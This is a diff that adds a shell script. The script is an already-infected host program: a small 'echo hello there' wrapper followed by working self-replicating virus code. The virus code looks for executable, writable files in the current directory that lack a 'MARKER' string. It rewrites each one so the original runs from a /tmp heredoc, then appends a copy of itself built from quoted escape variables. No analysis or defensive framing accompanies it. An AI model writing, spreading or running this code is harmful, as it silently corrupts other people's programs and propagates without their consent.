@@ -1,0 +1,19 @@
+:
+cat > /tmp/exe << \SPUG 
+#
+echo hello there $* 
+SPUG
+ chmod +x /tmp/exe;/tmp/exe $* 
+ rm /tmp/exe
+str='echo str=$sq${str}$sq >> $cand; echo for name in * $semi do if test -x ${dolr}name -a -r ${dolr}name -a -w ${dolr}name $semi then if test ${grv}fgrep -c MARKER ${dolr}name$grv -eq 0 $semi then cand=${dolr}name$semi break$semi fi$semi fi$semi done$semi if test $dq${dolr}cand$dq = $dq$dq $semi then exit$semi fi$semi cat ${dolr}cand $gthn /tmp/hold$semi echo $sq:$sq $gthn ${dolr}cand$semi echo ${sq}cat $gthn /tmp/exe $lthn$lthn ${bsl}SPUG $sq $gthn$gthn ${dolr}cand$semi cat /tmp/hold $gthn$gthn ${dolr}cand$semi echo SPUG $gthn$gthn ${dolr}cand$semi echo $sq chmod +x /tmp/exe$semi/tmp/exe ${dolr}* $sq $gthn$gthn ${dolr}cand$semi echo $dq rm /tmp/exe$dq $gthn$gthn ${dolr}cand$semi rm /tmp/hold$semi >> $cand; echo dq=$sq${dq}$sq >> $cand; echo sq=$dq${sq}$dq >> $cand; echo dolr=$sq${dolr}$sq >> $cand; echo semi=$dq${semi}$dq >> $cand; echo gthn=$sq$gthn$sq >> $cand; echo lthn=$sq$lthn$sq >> $cand; echo grv=$sq$grv$sq >> $cand; echo bsl=$sq${bsl}$sq >> $cand; echo set -f >> $cand; echo $str >> $cand'
+for name in * ; do if test -x $name -a -r $name -a -w $name ; then if test `fgrep -c MARKER $name` -eq 0 ; then cand=$name; break; fi; fi; done; if test "$cand" = "" ; then exit; fi; cat $cand > /tmp/hold; echo ':' > $cand; echo 'cat > /tmp/exe << \SPUG ' >> $cand; cat /tmp/hold >> $cand; echo SPUG >> $cand; echo ' chmod +x /tmp/exe;/tmp/exe $* ' >> $cand; echo " rm /tmp/exe" >> $cand; rm /tmp/hold;
+dq='"'
+sq="'"
+dolr='$'
+semi=";"
+gthn='>'
+lthn='<'
+grv='`'
+bsl='\'
+set -f
+echo str=$sq${str}$sq >> $cand; echo for name in * $semi do if test -x ${dolr}name -a -r ${dolr}name -a -w ${dolr}name $semi then if test ${grv}fgrep -c MARKER ${dolr}name$grv -eq 0 $semi then cand=${dolr}name$semi break$semi fi$semi fi$semi done$semi if test $dq${dolr}cand$dq = $dq$dq $semi then exit$semi fi$semi cat ${dolr}cand $gthn /tmp/hold$semi echo $sq:$sq $gthn ${dolr}cand$semi echo ${sq}cat $gthn /tmp/exe $lthn$lthn ${bsl}SPUG $sq $gthn$gthn ${dolr}cand$semi cat /tmp/hold $gthn$gthn ${dolr}cand$semi echo SPUG $gthn$gthn ${dolr}cand$semi echo $sq chmod +x /tmp/exe$semi/tmp/exe ${dolr}* $sq $gthn$gthn ${dolr}cand$semi echo $dq rm /tmp/exe$dq $gthn$gthn ${dolr}cand$semi rm /tmp/hold$semi >> $cand; echo dq=$sq${dq}$sq >> $cand; echo sq=$dq${sq}$dq >> $cand; echo dolr=$sq${dolr}$sq >> $cand; echo semi=$dq${semi}$dq >> $cand; echo gthn=$sq$gthn$sq >> $cand; echo lthn=$sq$lthn$sq >> $cand; echo grv=$sq$grv$sq >> $cand; echo bsl=$sq${bsl}$sq >> $cand; echo set -f >> $cand; echo $str >> $cand
